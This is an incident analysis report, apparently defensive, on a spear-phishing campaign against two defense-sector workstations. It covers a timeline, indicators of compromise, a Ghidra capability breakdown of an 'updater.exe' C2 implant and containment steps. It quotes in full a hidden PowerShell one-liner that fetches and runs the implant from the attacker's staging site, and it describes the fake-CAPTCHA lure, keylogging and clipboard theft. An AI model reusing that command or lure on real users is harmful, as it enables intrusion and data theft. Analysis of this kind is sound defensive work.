# Incident Analysis Report

## Summary
Two corporate workstations (`anders-desktop`, `john-desktop`) were compromised by a custom Windows C2 implant disguised as `updater.exe`. Initial access was a social-engineering phishing lure pointing to a typosquatted "file share" site (`f1leshare.net`), which delivered the implant via a hidden PowerShell IWR command. The implant established persistence as `MicrosoftUpdater`, beaconed AES-encrypted JSON to a typosquatted C2 (`miccosoftupdate.com` / `windowsupdater.tk`), and executed reconnaissance plus data theft (clipboard / window titles / file reads). Two users on different organizations (Kongsberg and Airbus) were targeted.

## Timeline (2026-03-29, UTC)

| Time | Event | Source |
|---|---|---|
| 17:46:30 | DNS lookups for `f1leshare.net` from `anders-desktop` | `logs-network_traffic.dns` |
| 17:46:32 | Anders visits lure page `http://f1leshare.net/?file=kongsberggrupper-insider&share=nordnet.no` (User-Agent: Edge) | `logs-network_traffic.http` |
| 17:46:41 | Fake "captcha" page hit: `…/captcha?email=anders%40kongsberg.com&q=Fortinet/abh4whnesdgbw07f/Important+Download` | http logs |
| 17:47:03 | John on `john-desktop` hits sibling lure `?file=norway-buys-80-jets&share=reddit.com`, then `…/captcha?email=john%40airbus.com&...` | http logs |
| 17:47:07 | Hidden PowerShell IWR downloads `updater.exe` to `%TEMP%` (UA: `WindowsPowerShell/5.1`) | http + alerts |
| 17:47:20 | `updater.exe` launched by `powershell.exe` from `C:\Users\anders\AppData\Local\Temp\updater.exe` | `endpoint.events.process` |
| 17:47:21 | Persistence Run-key written: `HKU\…\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdater` → `C:\Users\anders\AppData\Local\Microsoft\updater.exe` | `endpoint.events.registry` |
| 17:47:19 → 17:47:49 | DNS for `miccosoftupdate.com` then `windowsupdater.tk` | dns logs |
| 17:47:49+ | Repeated `POST` beacons to `http://windowsupdater.tk/windows/checkforupdate` and `…/update/servicedata` (UA `Mozilla/5.0`, dst `10.3.215.83`) | http logs |
| 17:48:22 → 17:53:22 | `updater.exe` spawns `cmd.exe /c dir …` for `C:\Users`, `…\Documents`, `…\Desktop`, then `cmd.exe /c type "C:\Users\anders\Desktop\polen.eml"` | process logs / alerts |
| 17:49:12 | Same `updater.exe` runs on `john-desktop` | process logs |

## Indicators of Compromise

### Network / C2
- **Phishing/staging domain:** `f1leshare.net` (typosquat of `fileshare.net`) — proof: DNS queries and HTTP GETs from both victims; serves fake Fortinet/CAPTCHA UI and `/download/updater`.
- **Payload URL:** `http://f1leshare.net/download/updater` — proof: HTTP GET with `WindowsPowerShell/5.1` UA, immediately followed by `updater.exe` write to `%TEMP%`.
- **C2 domains (typosquats of `microsoftupdate.com`):**
  - `miccosoftupdate.com` — proof: DNS query at 17:47:19 + hardcoded string `MiccosoftUpdate.com` at `0x14001300c` in the binary.
  - `windowsupdater.tk` — proof: hardcoded at `0x140013059`; observed POSTs to `10.3.215.83`.
- **C2 destination IP:** `10.3.215.83` (proof: http logs).
- **Staging IP:** `10.3.124.26` (proof: http logs for `f1leshare.net`).
- **C2 URI paths:** `/windows/checkforupdate`, `/update/servicedata`, `/api/data`, `/api/info` — proof: strings at `0x140013141`, `0x140013075`, `0x14001306b`, `0x14001327d`; observed POSTs in http logs.
- **C2 User-Agent:** literal `Mozilla/5.0` (truncated, atypical) — proof: string at `0x140013000` and observed POSTs.

### Host
- **Dropper path:** `C:\Users\<user>\AppData\Local\Temp\updater.exe` (proof: file event + process exec logs).
- **Persistent copy:** `C:\Users\<user>\AppData\Local\Microsoft\updater.exe` (proof: registry event; binary string `%s\Microsoft\updater.exe` at `0x140013197`).
- **Run-key persistence:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdater` (proof: registry event by `updater.exe`; strings at `0x1400131b0`, `0x1400131de`).
- **Scheduled-task tampering:** `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MicrosoftUpdater` (proof: hardcoded string at `0x1400131f0` — secondary persistence).
- **Single-instance mutex:** `Global\MicrosoftUpdateMutex` (string at `0x14001324f`).
- **Dropped/read evidence file:** `C:\Users\anders\Desktop\polen.eml` — likely the original phishing email read out by the operator via `cmd.exe /c type` (process log 17:51:53). Strongly suggests the lure was an email-based "Fortinet — Important Download" message.

### Targets
- Users `anders@kongsberg.com` (Kongsberg Gruppen — defense) and `john@airbus.com` (Airbus). The targeting strings in the lure URLs (`kongsberggrupper-insider`, `norway-buys-80-jets`) indicate **deliberate spear-phishing of defense-sector employees**.

## Binary capabilities (Ghidra, `updater.exe`)
Imports + strings show the implant supports:
- **HTTP C2** (`WININET.dll`: `InternetOpenA`, `InternetConnectA`, `HttpOpenRequestA`, `HttpSendRequestA`, `InternetReadFile`).
- **Symmetric crypto for traffic/config:** `bcrypt.dll` AES with `ChainingModeECB` (strings at `0x140013098`/`0x1400130b8`; functions `BCryptGenerateSymmetricKey`, `BCryptEncrypt`, `BCryptDecrypt`). Base64 alphabet at `0x140013298` confirms encoded transport.
- **System fingerprinting:** `GetComputerNameA`, `GetUserNameA`, `GetSystemInfo`, `GlobalMemoryStatusEx` — assembled into the beacon template `Host: %s\nUser: %s\nArch: %s\nCPUs: %lu\nRAM: %llu MB\n` (`0x140013100`).
- **Remote command execution:** spawns `cmd.exe /c %s` (string at `0x140013133`) via `CreateProcessA` + `CreatePipe` (output capture). JSON command field `"command":` at `0x14001317f` confirms tasking format.
- **Keylogger / credential theft:** `GetAsyncKeyState`, `GetForegroundWindow`, `GetWindowTextA` (window-title capture: `[WINDOW: %s]` at `0x140013287`).
- **Clipboard stealer:** `OpenClipboard`/`GetClipboardData`/`GlobalLock` plus tag `[CLIPBOARD] %s` at `0x1400130d2`.
- **File ops / spreading:** `CopyFileA`, `CreateDirectoryA`, `FindFirstFileA`/`FindNextFileA`, `DeleteFileA`, `RemoveDirectoryA`, `CreateMutexA`.
- **Persistence APIs:** `RegCreateKeyExA`/`RegSetValueExA`.
- **TLS callbacks present** (`tls_callback_0/1` at `0x140003e00/0x140003e30`) — an anti-analysis / early-exec hook common in malware.
- Compiler artifact: built with MinGW-w64 GCC 9.3 / 10 (`GCC: (GNU) 9.3-win32 20200320`).

## What likely happened
1. **Targeted phishing.** Operators sent emails (e.g. `polen.eml` on Anders' desktop) impersonating a "Fortinet — Important Download" notification, with per-victim URLs at `f1leshare.net` (`?file=…&share=…`) personalized to the target (Nordnet for a Kongsberg employee, Reddit for an Airbus employee).
2. **Drive-by-style social engineering.** The site shows a Fortinet logo and a fake CAPTCHA (`/captcha?email=<victim>&q=Fortinet/abh4whnesdgbw07f/Important+Download`) — almost certainly a "ClickFix"/copy-paste-PowerShell trick. The captcha page yielded the PowerShell one-liner:
   `powershell -exec bypass -windowstyle hidden -command "[…]ServerCertificateValidationCallback={$true}; IWR -Uri 'http://f1leshare.net/download/updater' -OutFile $env:TEMP\updater.exe -UseBasicParsing; & $env:TEMP\updater.exe"`
3. **Implant install.** `updater.exe` (MinGW C2) ran from `%TEMP%`, copied itself to `%LOCALAPPDATA%\Microsoft\updater.exe`, set the `MicrosoftUpdater` Run key, and used the `Global\MicrosoftUpdateMutex` to ensure single instance.
4. **C2 beaconing.** Implant resolved `miccosoftupdate.com`, then sent AES-ECB+Base64 encrypted POSTs to `http://windowsupdater.tk/windows/checkforupdate` (poll) and `/update/servicedata` (results) every ~30s. First beacon contained host fingerprint (hostname, user, arch, CPU count, RAM).
5. **Hands-on-keyboard recon and data theft.** The operator tasked the implant to enumerate `C:\Users`, `Documents`, `Desktop` via `cmd.exe /c dir`, then read the user's phishing email back (`cmd.exe /c type "…\polen.eml"`), most likely to verify the lure had been delivered/cover tracks. Capabilities for keylogging, window-title capture, and clipboard theft were available and would run in parallel.
6. **Spread.** The same campaign hit `john-desktop` (Airbus) ~2 minutes later via the same staging site, suggesting a coordinated multi-victim spear-phishing operation rather than a one-off.

## Recommended containment
- Block DNS / sinkhole: `f1leshare.net`, `miccosoftupdate.com`, `windowsupdater.tk`.
- Block egress to `10.3.124.26`, `10.3.215.83`.
- On affected hosts: kill `updater.exe`, delete `%LOCALAPPDATA%\Microsoft\updater.exe` and `%TEMP%\updater.exe`, remove `HKCU\…\Run\MicrosoftUpdater`, delete scheduled task `MicrosoftUpdater`.
- Hunt across estate for the Run-key name `MicrosoftUpdater`, mutex `Global\MicrosoftUpdateMutex`, UA exactly `Mozilla/5.0`, and process tree `powershell.exe → updater.exe → cmd.exe`.
- Reset credentials for users `anders` and `john` (clipboard/keylog exposure).
- Recover `polen.eml` and any sibling messages for full phishing kit attribution.
